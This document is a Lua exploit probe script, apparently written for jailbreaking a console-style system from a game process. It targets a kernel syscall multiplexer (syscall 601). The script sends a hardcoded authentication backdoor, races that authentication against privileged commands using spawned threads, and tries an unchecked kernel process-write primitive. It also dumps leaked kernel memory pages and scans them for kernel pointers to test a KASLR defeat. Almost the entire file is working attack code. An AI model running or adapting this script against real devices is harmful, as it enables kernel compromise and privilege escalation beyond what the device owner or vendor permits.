-- CRASH_CLASS: MODERATE
-- PROBE 83b: sys 601 threaded auth race — racing auth state with exploit cmds
--
-- Building on 83a (sequential deep retest) and 88b (threading pattern).
-- sys 601 process control multiplexer, CRITICAL vulns from 13.60 decompile:
--   1. Cmd 0x0c — Hardcoded auth backdoor: 0xCD/0x41 pass XOR check
--   2. Cmd 0x12 — Unchecked write to proc+0x578/+0x580 (kfree at teardown)
--   3. Cmd 0x10 — 0x1000-byte kernel page copyout (info leak)
--   4. Cmd 0x05 — 0xb8-byte process info leak
--   5. Ring buffer signed comparison bypass -> heap underflow
--
-- TEST_SECTION: "A"=baseline, "B"=auth race, "C"=init race, "D"=kptr scan

local TEST_SECTION = "A"

print("=== PROBE 83b: SYS 601 THREADED AUTH RACE ===")
print("Section: " .. TEST_SECTION)
print("")

collectgarbage("stop")

-- ================================================================
-- Helpers
-- ================================================================
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function q(v)
    if v == nil then return "nil" end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X_%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function is_kptr(val)
    if val == nil then return false end
    local h, _ = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end
local function write_byte(addr, b)
    return pcall(function() memory.write_byte(addr, b) end)
end

-- Syscall constructors
local sc_601       = make_syscall(601)
local sc_thr_create = make_syscall(430)
local sc_thr_kill  = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap      = make_syscall(477)

-- thr_create context offsets (confirmed 14.10)
local C_RDI=0x048; local C_RSI=0x050; local C_RDX=0x058
local C_RAX=0x078; local C_CS=0x0C0;  local C_FLAGS=0x0D0
local C_RIP=0x0E0; local C_RSP=0x0F8; local C_SS=0x100
local C_MAGIC=0x108; local C_TYPE=0x110

-- Canary + buffers
local stub = syscall.pipe.fn_addr
local pid = to_num(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid)

local function canary()
    local ok = pcall(function() native.fcall_with_rax(stub, 20) end)
    return ok and "ALIVE" or "DEAD"
end

local BUF_SIZE = 0x2000
local inbuf  = memory.alloc(BUF_SIZE)
local outbuf = memory.alloc(BUF_SIZE)

local function call_601(cmd, in_ptr, out_ptr)
    zero(outbuf, BUF_SIZE)
    local ok, rv = pcall(function()
        return sc_601(uint64(cmd), uint64(in_ptr or 0), uint64(out_ptr or 0))
    end)
    return ok, rv
end

-- Resolve libkernel wrapper (syscall_address - 7)
local function get_wrapper()
    local SW = syscall.syscall_address
    if SW == nil then return nil end
    local sw_hi, sw_lo = get_hi_lo(SW)
    if sw_hi < 0 then sw_hi = sw_hi + 0x100000000 end
    if sw_lo < 0 then sw_lo = sw_lo + 0x100000000 end
    if sw_lo < 7 then
        sw_lo = sw_lo + 0x100000000 - 7; sw_hi = sw_hi - 1
    else sw_lo = sw_lo - 7 end
    return uint64(string.format("0x%X%08X", sw_hi, sw_lo))
end

-- Thread helpers
local STACK_SIZE = 0x100000

local function alloc_child_stack(wrapper_addr)
    local ok_stk, child_stack = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok_stk then return nil end
    for off = 0, STACK_SIZE - 8, 8 do wq(child_stack + off, wrapper_addr) end
    return child_stack
end

local function build_ctx(wrapper_addr, stack_addr, rax_val, rdi_val)
    local ctx = memory.alloc(0x200)
    zero(ctx, 0x200)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wq(ctx + C_TYPE, uint64(0x10000))
    wq(ctx + C_CS, uint64(0x43))
    wq(ctx + C_SS, uint64(0x3B))
    wq(ctx + C_RIP, wrapper_addr)
    wq(ctx + C_RSP, stack_addr)
    wq(ctx + C_RAX, uint64(rax_val))
    wq(ctx + C_RDI, uint64(rdi_val))
    wq(ctx + C_RSI, uint64(0))
    wq(ctx + C_RDX, uint64(0))
    return ctx
end

local function spawn_thread(ctx)
    local tid_buf = memory.alloc(8)
    wq(tid_buf, uint64(0))
    local ok_tc, rv_tc = pcall(function()
        return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
    end)
    return ok_tc, rv_tc, rq(tid_buf)
end

local function kill_thread(tid)
    if tid and to_num(tid) ~= 0 then
        pcall(function() sc_thr_kill(tid, uint64(9)) end)
    end
end

local function thread_alive(tid)
    if tid == nil or to_num(tid) == 0 then return false end
    local ok, rv = pcall(function() return sc_thr_kill(tid, uint64(0)) end)
    return ok and to_num(rv) == 0
end

local function nanosleep_ms(ms)
    local ts = memory.alloc(16)
    wq(ts, uint64(math.floor(ms / 1000)))
    wq(ts + 8, uint64((ms % 1000) * 1000000))
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

local function prepare_auth_buf(buf, off)
    zero(buf, 0x40)
    write_byte(buf + (off or 0), 0xCD)
    write_byte(buf + (off or 0) + 1, 0x41)
end

local function scan_kptrs(buf, nbytes, label)
    local found = 0
    for off = 0, nbytes - 8, 8 do
        local val = rq(buf + off)
        if val and is_kptr(val) then
            found = found + 1
            if found <= 20 then
                print(string.format("  [%s] KPTR +0x%03X: %s", label, off, q(val)))
            end
        end
    end
    if found > 20 then print("  [" .. label .. "] (" .. found .. " total, truncated)") end
    return found
end

local function dump_nonzero(buf, nbytes, label)
    for off = 0, nbytes - 4, 4 do
        local val = rd(buf + off)
        if val and val ~= 0 then
            local tag = ""
            if off % 8 == 0 then
                local qv = rq(buf + off)
                if qv and is_kptr(qv) then tag = " *** KPTR ***" end
            end
            print(string.format("  [%s] +0x%03X: 0x%08X%s", label, off, val, tag))
        end
    end
end

-- Spawn a gettimeofday-spinning child thread for scheduling pressure.
-- Returns child_tid or nil.
local function spawn_pressure_thread()
    local wrapper = get_wrapper()
    if wrapper == nil then return nil end
    local tv_page = memory.alloc(0x1000)
    zero(tv_page, 0x1000)
    local child_stack = alloc_child_stack(wrapper)
    if child_stack == nil then return nil end
    local ctx = build_ctx(wrapper, child_stack, 116, to_num(tv_page))
    local ok_tc, rv_tc, child_tid = spawn_thread(ctx)
    if to_num(rv_tc) ~= 0 then return nil end
    nanosleep_ms(10)
    if not thread_alive(child_tid) then return nil end
    -- Verify child is running
    local tv_sec = rd(tv_page)
    if (tv_sec or 0) ~= 0 then print("  *** CHILD THREAD IS RUNNING ***") end
    return child_tid
end

-- ================================================================
-- SECTION A: Baseline sys 601 reachability
-- ================================================================
if TEST_SECTION == "A" then
    print("--- Section A: Baseline sys 601 reachability ---")

    -- cmd 0x00 init
    print("\n[A1] cmd 0x00 (init)...")
    zero(inbuf, BUF_SIZE)
    local ok0, rv0 = call_601(0x00, inbuf, outbuf)
    print("  ok=" .. tostring(ok0) .. " rv=" .. (ok0 and q(rv0) or "FAIL"))
    if ok0 and to_num(rv0) == 0 then dump_nonzero(outbuf, 0x20, "0x00") end

    -- cmd 0x01 proc init
    print("\n[A2] cmd 0x01 (proc init)...")
    zero(inbuf, BUF_SIZE)
    local ok1, rv1 = call_601(0x01, inbuf, outbuf)
    print("  ok=" .. tostring(ok1) .. " rv=" .. (ok1 and q(rv1) or "FAIL"))

    -- cmd 0x05 info leak
    print("\n[A3] cmd 0x05 (0xb8 info leak)...")
    zero(inbuf, BUF_SIZE)
    local ok5, rv5 = call_601(0x05, inbuf, outbuf)
    print("  ok=" .. tostring(ok5) .. " rv=" .. (ok5 and q(rv5) or "FAIL"))
    if ok5 and to_num(rv5) == 0 then
        print("  *** 0xb8-BYTE INFO LEAK ***")
        scan_kptrs(outbuf, 0xB8, "0x05")
    end

    -- cmd 0x10 page copyout
    print("\n[A4] cmd 0x10 (page copyout)...")
    zero(inbuf, BUF_SIZE)
    local ok10, rv10 = call_601(0x10, inbuf, outbuf)
    print("  ok=" .. tostring(ok10) .. " rv=" .. (ok10 and q(rv10) or "FAIL"))
    if ok10 and to_num(rv10) == 0 then
        print("  *** 0x1000-BYTE KERNEL PAGE COPYOUT ***")
        scan_kptrs(outbuf, 0x1000, "0x10")
    end

    -- cmd 0x0c auth single-shot
    -- NOTE: cmd 0x0c BLOCKS (30s+) on this game instance (pid-dependent?).
    -- 55d (pid 170) returned -1 instantly; 83b (pid 665) hangs.
    -- Skipping in Section A baseline — tested in B/C race sections.
    print("\n[A5] cmd 0x0c SKIPPED (known blocker — tested in Section B/C)")

    -- cmd 0x12 write probe
    print("\n[A6] cmd 0x12 (write probe)...")
    zero(inbuf, BUF_SIZE)
    wq(inbuf, uint64(0x4141414141414141))
    wq(inbuf + 8, uint64(0x4242424242424242))
    local ok12, rv12 = call_601(0x12, inbuf, outbuf)
    print("  ok=" .. tostring(ok12) .. " rv=" .. (ok12 and q(rv12) or "FAIL"))
    if ok12 and to_num(rv12) == 0 then print("  *** PROCESS WRITE ACCEPTED ***") end

    print("\ncanary: " .. canary())
    print("[A-DONE]")

-- ================================================================
-- SECTION B: Threaded auth race
-- Child thread spins gettimeofday for scheduling pressure.
-- Main thread rapid-fires: auth(0x0c) -> exploit(0x10/0x12) loops.
-- ================================================================
elseif TEST_SECTION == "B" then
    print("--- Section B: Threaded auth race ---")

    -- Init subsystem
    zero(inbuf, BUF_SIZE)
    local ok_init, rv_init = call_601(0x00, inbuf, outbuf)
    print("[B0] init: ok=" .. tostring(ok_init) .. " rv=" .. (ok_init and q(rv_init) or "FAIL"))

    -- Spawn pressure thread
    print("\n[B1] Spawning scheduling-pressure child...")
    local child_tid = spawn_pressure_thread()
    local mode = child_tid and "threaded" or "single"
    print("  mode: " .. mode)

    -- Strategy 1: auth(0x0c) -> read(0x10) race
    print("\n[B2] Auth->Read race (" .. mode .. ", 16 rounds)...")
    local auth_wins, read_wins, kptr_total = 0, 0, 0

    for round = 1, 16 do
        prepare_auth_buf(inbuf, 0)
        local ok_a, rv_a = call_601(0x0c, inbuf, outbuf)
        local auth_ok = ok_a and to_num(rv_a) == 0
        if auth_ok then auth_wins = auth_wins + 1 end

        zero(inbuf, BUF_SIZE)
        local ok_r, rv_r = call_601(0x10, inbuf, outbuf)
        local read_ok = ok_r and to_num(rv_r) == 0
        if read_ok then
            read_wins = read_wins + 1
            kptr_total = kptr_total + scan_kptrs(outbuf, 0x1000, "B2-r" .. round)
        end

        if round <= 4 or auth_ok or read_ok then
            print(string.format("  round %2d: auth=%s read=%s",
                round, auth_ok and "YES" or "no", read_ok and "YES" or "no"))
        end
    end
    print("[B2] auth=" .. auth_wins .. " read=" .. read_wins .. " kptrs=" .. kptr_total)

    -- Strategy 2: auth(0x0c) -> write(0x12) race
    print("\n[B3] Auth->Write race (16 rounds)...")
    local write_wins = 0

    for round = 1, 16 do
        prepare_auth_buf(inbuf, 0)
        local ok_a2, rv_a2 = call_601(0x0c, inbuf, outbuf)
        local auth_ok2 = ok_a2 and to_num(rv_a2) == 0

        zero(inbuf, BUF_SIZE)
        wq(inbuf, uint64(0x8300000000000000 + round))
        wq(inbuf + 8, uint64(0x8300000000000000 + round + 0x100))
        local ok_w, rv_w = call_601(0x12, inbuf, outbuf)
        local write_ok = ok_w and to_num(rv_w) == 0
        if write_ok then write_wins = write_wins + 1 end

        if round <= 4 or auth_ok2 or write_ok then
            print(string.format("  round %2d: auth=%s write=%s",
                round, auth_ok2 and "YES" or "no", write_ok and "YES(!!!)" or "no"))
        end
    end
    print("[B3] write_wins=" .. write_wins)
    if write_wins > 0 then print("  *** AUTH RACE -> PROCESS WRITE PRIMITIVE ***") end

    -- Strategy 3: auth byte offset sweep
    print("\n[B4] Auth offset sweep + exploit...")
    local offsets = {0, 1, 4, 8, 0x10, 0x18, 0x20, 0x28}
    for _, off in ipairs(offsets) do
        prepare_auth_buf(inbuf, off)
        local ok_ao, rv_ao = call_601(0x0c, inbuf, outbuf)
        local auth_hit = ok_ao and to_num(rv_ao) == 0
        if auth_hit then
            zero(inbuf, BUF_SIZE)
            local ok_ro, rv_ro = call_601(0x10, inbuf, outbuf)
            local kp = 0
            if ok_ro and to_num(rv_ro) == 0 then kp = scan_kptrs(outbuf, 0x1000, "B4") end
            print(string.format("  off=0x%02X: AUTH=YES read=%s kptrs=%d",
                off, (ok_ro and to_num(rv_ro) == 0) and "YES" or "no", kp))
        else
            print(string.format("  off=0x%02X: AUTH=no", off))
        end
    end

    kill_thread(child_tid)
    print("\ncanary: " .. canary())
    print("[B-DONE]")

-- ================================================================
-- SECTION C: Threaded init race
-- Child perturbs scheduling; main fires init(0x00)->write(0x12) and
-- variations: single init, double init (0x00+0x01), and init+auth+write.
-- ================================================================
elseif TEST_SECTION == "C" then
    print("--- Section C: Threaded init race ---")

    print("\n[C1] Spawning scheduling-pressure child...")
    local child_tid = spawn_pressure_thread()
    local mode = child_tid and "threaded" or "single"
    print("  mode: " .. mode)

    local ROUNDS = 20

    -- Three race strategies, each: init sequence -> immediate cmd 0x12
    local strategies = {
        {name = "init(0x00)->write",
         pre = function()
             zero(inbuf, BUF_SIZE)
             call_601(0x00, inbuf, outbuf)
         end},
        {name = "init(0x00)+init(0x01)->write",
         pre = function()
             zero(inbuf, BUF_SIZE); call_601(0x00, inbuf, outbuf)
             zero(inbuf, BUF_SIZE); call_601(0x01, inbuf, outbuf)
         end},
        {name = "init(0x00)+auth(0x0c)->write",
         pre = function()
             zero(inbuf, BUF_SIZE); call_601(0x00, inbuf, outbuf)
             prepare_auth_buf(inbuf, 0); call_601(0x0c, inbuf, outbuf)
         end},
    }

    for si, strat in ipairs(strategies) do
        print(string.format("\n[C%d] %s (%d rounds)...", si + 1, strat.name, ROUNDS))
        local wins = 0

        for round = 1, ROUNDS do
            strat.pre()
            -- Immediate write — race the completion
            zero(inbuf, BUF_SIZE)
            wq(inbuf, uint64(0xC300000000000000 + si * 0x1000 + round))
            wq(inbuf + 8, uint64(0xC300000000000000 + si * 0x1000 + round + 0x100))
            local ok_w, rv_w = call_601(0x12, inbuf, outbuf)
            local write_ok = ok_w and to_num(rv_w) == 0
            if write_ok then wins = wins + 1 end
            if round <= 3 or write_ok then
                print(string.format("  round %2d: write=%s", round, write_ok and "YES(!!!)" or "no"))
            end
        end

        print("  wins=" .. wins .. "/" .. ROUNDS)
        if wins > 0 then print("  *** " .. strat.name .. " RACE -> WRITE PRIMITIVE ***") end
    end

    kill_thread(child_tid)
    print("\ncanary: " .. canary())
    print("[C-DONE]")

-- ================================================================
-- SECTION D: Kernel pointer scan of cmd 0x05 and 0x10 output
-- Classifies pointers, detects tables, checks KASLR stability.
-- ================================================================
elseif TEST_SECTION == "D" then
    print("--- Section D: Kernel pointer scan ---")

    -- Init + auth to maximize data
    zero(inbuf, BUF_SIZE); call_601(0x00, inbuf, outbuf)
    prepare_auth_buf(inbuf, 0); call_601(0x0c, inbuf, outbuf)

    local function classify_kptr(val)
        local h, _ = get_hi_lo(val)
        if h < 0 then h = h + 0x100000000 end
        if h >= 0xFFFFFFFF then return "TEXT"
        elseif h >= 0xFFFFF000 then return "HEAP"
        elseif h >= 0xFFFFE000 then return "STACK"
        elseif h >= 0xFFFF8000 then return "MODULE"
        end
        return "UNK"
    end

    -- Part 1: cmd 0x05
    print("\n[D1] cmd 0x05 (0xb8-byte process info)...")
    zero(inbuf, BUF_SIZE); zero(outbuf, BUF_SIZE)
    local ok5, rv5 = call_601(0x05, inbuf, outbuf)
    print("  ok=" .. tostring(ok5) .. " rv=" .. (ok5 and q(rv5) or "FAIL"))

    if ok5 and to_num(rv5) == 0 then
        local kptrs_05 = {}
        for off = 0, 0xB0, 8 do
            local val = rq(outbuf + off)
            if val then
                local h, l = get_hi_lo(val)
                if h < 0 then h = h + 0x100000000 end
                if l < 0 then l = l + 0x100000000 end
                if h ~= 0 or l ~= 0 then
                    local cls = is_kptr(val) and classify_kptr(val) or ""
                    local tag = cls ~= "" and (" [" .. cls .. "]") or ""
                    print(string.format("  +0x%02X: %s%s", off, q(val), tag))
                    if cls ~= "" then kptrs_05[#kptrs_05 + 1] = off end
                end
            end
        end
        print("  kernel pointers: " .. #kptrs_05)
    end

    -- Part 2: cmd 0x10 (full page)
    print("\n[D2] cmd 0x10 (0x1000-byte page copyout)...")
    zero(inbuf, BUF_SIZE); zero(outbuf, BUF_SIZE)
    local ok10, rv10 = call_601(0x10, inbuf, outbuf)
    print("  ok=" .. tostring(ok10) .. " rv=" .. (ok10 and q(rv10) or "FAIL"))

    if ok10 and to_num(rv10) == 0 then
        local regions = {}
        local kptr_offs = {}
        for off = 0, 0xFF8, 8 do
            local val = rq(outbuf + off)
            if val and is_kptr(val) then
                local cls = classify_kptr(val)
                regions[cls] = (regions[cls] or 0) + 1
                kptr_offs[#kptr_offs + 1] = off
                if #kptr_offs <= 15 then
                    print(string.format("  +0x%03X: %s [%s]", off, q(val), cls))
                end
            end
        end
        if #kptr_offs > 15 then print("  (" .. #kptr_offs .. " total, truncated)") end
        print("  by region:")
        for cls, cnt in pairs(regions) do print("    " .. cls .. ": " .. cnt) end

        -- Detect pointer tables (3+ consecutive kptrs)
        print("\n  pointer tables (3+ consecutive):")
        local run_start, run_len, tables = nil, 0, 0
        for off = 0, 0xFF8, 8 do
            local val = rq(outbuf + off)
            if val and is_kptr(val) then
                if run_start == nil then run_start = off end
                run_len = run_len + 1
            else
                if run_len >= 3 then
                    tables = tables + 1
                    print(string.format("    TABLE +0x%03X, %d entries", run_start, run_len))
                end
                run_start = nil; run_len = 0
            end
        end
        if run_len >= 3 then
            tables = tables + 1
            print(string.format("    TABLE +0x%03X, %d entries", run_start, run_len))
        end
        print("  tables found: " .. tables)
    end

    -- Part 3: KASLR stability (5 reads)
    print("\n[D3] KASLR stability (5 reads of cmd 0x10)...")
    local first_kptr_val = nil
    local consistent = true

    for attempt = 1, 5 do
        zero(inbuf, BUF_SIZE); zero(outbuf, BUF_SIZE)
        local ok_r, rv_r = call_601(0x10, inbuf, outbuf)
        if ok_r and to_num(rv_r) == 0 then
            for off = 0, 0xFF8, 8 do
                local val = rq(outbuf + off)
                if val and is_kptr(val) then
                    local vs = q(val)
                    if first_kptr_val == nil then
                        first_kptr_val = vs
                        print("  #" .. attempt .. ": first KPTR=" .. vs)
                    else
                        local same = (vs == first_kptr_val)
                        if not same then consistent = false end
                        print("  #" .. attempt .. ": " .. vs .. (same and " (same)" or " (DIFFERENT!)"))
                    end
                    break
                end
            end
        else
            print("  #" .. attempt .. ": cmd 0x10 failed")
        end
    end

    if first_kptr_val then
        print("  KASLR " .. (consistent and "CONSISTENT — KASLR DEFEAT CANDIDATE" or "VARIES"))
    end

    -- Part 4: bonus commands
    print("\n[D4] Additional info...")
    zero(inbuf, BUF_SIZE); zero(outbuf, BUF_SIZE)
    local ok9, rv9 = call_601(0x09, inbuf, outbuf)
    print("  cmd 0x09: ok=" .. tostring(ok9) .. " rv=" .. (ok9 and q(rv9) or "FAIL"))
    if ok9 and to_num(rv9) == 0 then dump_nonzero(outbuf, 0x20, "0x09") end

    zero(inbuf, BUF_SIZE); zero(outbuf, BUF_SIZE)
    local ok7, rv7 = call_601(0x07, inbuf, outbuf)
    print("  cmd 0x07: ok=" .. tostring(ok7) .. " rv=" .. (ok7 and q(rv7) or "FAIL"))
    if ok7 and to_num(rv7) == 0 then dump_nonzero(outbuf, 0x20, "0x07") end

    print("\ncanary: " .. canary())
    print("[D-DONE]")

else
    print("ERROR: Unknown TEST_SECTION: " .. tostring(TEST_SECTION))
    print("Valid: A, B, C, D")
end

print("\n=== PROBE 83b COMPLETE ===")
